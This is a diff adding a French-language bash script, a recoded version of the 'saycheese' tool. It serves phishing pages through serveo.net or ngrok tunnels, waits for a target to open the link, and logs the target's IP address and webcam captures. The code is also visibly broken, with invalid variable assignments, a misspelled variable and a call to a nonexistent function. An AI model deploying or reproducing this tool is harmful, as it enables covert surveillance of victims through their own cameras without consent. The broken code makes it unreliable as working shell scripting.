@@ -1,0 +1,169 @@
+#!/bin/bash
+# coder par: github.com/thelinuxchoice/saycheese
+# Si vous utilisez une partie de ce code, donnez-moi les crédits. Lisez la licence!
+
+trap 'printf "\n";arret' 2
+logo_peche() {
+printf "\e[0;35m╭━━━╮\e[0m\e[0;31m╱╱╱╱╱\e[0m\e[0;35m╭╮         \e[0m\n"
+printf "\e[0;35m┃╭━╮┃\e[0m\e[0;31m╱╱╱╱╱\e[0m\e[0;35m┃┃         \e[0m\n"
+printf "\e[0;35m┃╰━╯┣━━┳━━┫╰━┳━━╮                          \e[0m\n"
+printf "\e[0;35m┃╭━━┫┃━┫╭━┫╭╮┃┃━┫                          \e[0m\n"
+printf "\e[0;35m┃┃\e[0m\e[0;31m╱╱\e[0m\e[0;35m┃┃━┫╰━┫┃┃┃┃━┫\e[0m\n"
+printf "\e[0;35m╰╯\e[0m\e[0;31m╱╱\e[0m\e[0;35m╰━━┻━━┻╯╰┻━━╯\e[37m🅅2.0\e[0m\n"
+printf " \e[37m Recoded by \e[36mFaxel \e[0m \n\n"
+}
+arret() {
+checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
+checkphp=$(ps aux | grep -o "php" | head -n1)
+checkssh=$(ps aux | grep -o "ssh" | head -n1)
+if [[ $checkngrok == *'ngrok'* ]]; then
+pkill -f -2 ngrok > /dev/null 2>&1
+killall -2 ngrok > /dev/null 2>&1
+fi
+if [[ $checkphp == *'php'* ]]; then
+killall -2 php > /dev/null 2>&1
+fi
+if [[ $checkssh == *'ssh'* ]]; then
+killall -2 ssh > /dev/null 2>&1
+fi
+exit 1
+}
+dependencies() {
+command -v php > /dev/null 2>&1 || { echo >&2 "J'ai besoin de php mais il n'est pas installé. Installez-le et relancez."; exit 1; }
+}
+requete_ip() {
+ip_add = $(grep -a 'IP adresse :' ipadd.txt | cut -d " " -f2 | tr -d '\r')
+IFS = $'\n'
+printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP adresse cibler : \e[0m\e[1;77m %s\e[0m\n" $ip_add
+cat ipadd.txt >> Sauvegarder sous ipadd.txt
+}
+Verifions_ip_trouver() {
+printf "\n"
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Cible en attente,\e[0m\e[1;77m Appuyez sur Ctrl + C pour quitter...\e[0m\n"
+while [ true ]; do
+if [[ -e "ip.txt" ]]; then
+printf "\n\e[1;92m[\e[0m+\e[1;92m] La cible a ouvert le lien!\n"
+Verifion_ip_trouver
+rm -rf ipadd.txt
+fi
+sleep 0.5
+if [[ -e "Log.log" ]]; then
+printf "\n\e[1;92m[\e[0m+\e[1;92m] Fichier camera reçu!\e[0m\n"
+rm -rf Log.log
+fi
+sleep 0.5
+done 
+}
+serveur() {
+command -v ssh > /dev/null 2>&1 || { echo >&2 "J'ai besoin de ssh mais il n'est pas installé. Installez-le et relancez."; exit 1; }
+printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Démarrage du serveur Serveo...\e[0m\n"
+if [[ $checkphp == *'php'* ]]; then
+killall -2 php > /dev/null 2>&1
+fi
+if [[ $sous_domaine_response == true ]]; then
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$ous_domaine':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &
+sleep 8
+else
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &
+sleep 8
+fi
+printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Démarrage du serveur php... (localhost:3333)\e[0m\n"
+fuser -k 3333/tcp > /dev/null 2>&1
+php -S localhost:3333 > /dev/null 2>&1 &
+sleep 3
+envoi_lien = $(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
+printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Lien direct : \e[0m\e[1;77m %s\n' $envoi_lien
+}
+charge_utile_ngrok() {
+lien = $(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+sed 's+forwarding_link+'$lien'+g' faxel.html > index2.html
+sed 's+forwarding_link+'$lien'+g' modele.php > index.php
+}
+ngrok_serveur() {
+if [[ -e ngrok ]]; then
+echo ""
+else
+command -v unzip > /dev/null 2>&1 || { echo >&2 "J'ai besoin de décompresser mais ce n'est pas installé. Installez-le et relancez."; exit 1; }
+command -v wget > /dev/null 2>&1 || { echo >&2 "J'ai besoin de wget mais il n'est pas installé. Installez-le.et relancez."; exit 1; }
+printf "\e[1;92m[\e[0m+\e[1;92m] Téléchargement de Ngrok...\n"
+arch = $(uname -a | grep -o 'arm' | head -n1)
+arch2 = $(uname -a | grep -o 'Android' | head -n1)
+if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
+wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
+if [[ -e ngrok-stable-linux-arm.zip ]]; then
+unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
+chmod +x ngrok
+rm -rf ngrok-stable-linux-arm.zip
+else
+printf "\e[1;93m[!] Erreur de téléchargement ... Termux.\nExécutez cette commande \e[0m\e[1;77m pkg install wget\e[0m\n"
+exit 1
+fi
+else
+wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
+if [[ -e ngrok-stable-linux-386.zip ]]; then
+unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
+chmod +x ngrok
+rm -rf ngrok-stable-linux-386.zip
+else
+printf "\e[1;93m[!] Erreur de téléchargement... \e[0m\n"
+exit 1
+fi
+fi
+fi
+printf "\e[1;92m[\e[0m+\e[1;92m] Démarrage du serveur php...\n"
+php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
+sleep 2
+printf "\e[1;92m[\e[0m+\e[1;92m] Démarrage du serveur ngrok...\n"
+./ngrok http 3333 > /dev/null 2>&1 &
+sleep 10
+lien = $(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+printf "\e[1;92m[\e[0m*\e[1;92m] Lien direct: \e[0m\e[1;77m %s\e[0m\n" $lien
+charge_utile_ngrok
+Verifions_ip_trouver
+}
+commencons() {
+if [[ -e sendlink ]]; then
+rm -rf sendlink
+fi
+printf "\n"
+printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
+Serveur_par_default="1"
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choisissez une option de redirection de port : \e[0m' option_serveur
+option_serveur = "${option_serveur:-${Serveur_par_default}}"
+if [[ $option_serveur -eq 1 ]]; then
+command -v php > /dev/null 2>&1 || { echo >&2 "J'ai besoin de ssh mais il n'est pas installé.\nInstallez-le  pip2 install ssh et relancez."; exit 1; }
+debut
+elif [[ $option_serveur -eq 2 ]]; then
+ngrok_serveur
+else
+printf "\e[1;93m [!] Option invalide!\e[0m\n"
+sleep 1
+clear
+commencons
+fi
+}
+charge_utile() {
+envoi_du_lien = $(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
+sed 's+forwarding_link+'$envoi_du_lien'+g' faxel.html > index2.html
+sed 's+forwarding_link+'$envoi_du_lien'+g' modele.php > index.php
+}
+debut() {
+choix_par_defaut_sous = "O"
+sous_domaine_par_defaut="peche$RANDOM"
+printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choisissez un sous-domaine? \e[0m\e[1;31m(\e[0m\e[1;33mPar defaut \e[0m\e[1;31m:\e[0m\e[1;77m [O/n] \e[0m\e[1;31m): \e[0m\e[1;37m \e[0m'
+read choix_sous
+choix_sous = "${choix_sous:-${choix_par_defaut_sous}}"
+if [[ $choix_sous == "O" || $choix_sous == "o" || $choix_sous == "OUI" || $choix_sous == "oui" ]]; then
+sous_domaine_response = true
+printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Sous-domaine : (Par defaut:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $sous_domaine_par_defaut
+read sous_domaine
+sous_domaine = "${sous_domaine:-${sous_domaine_par_defaut}}"
+fi
+serveur
+charge_utile
+Verifions_ip_trouver
+}
+logo_peche
+dependencies
+commencons
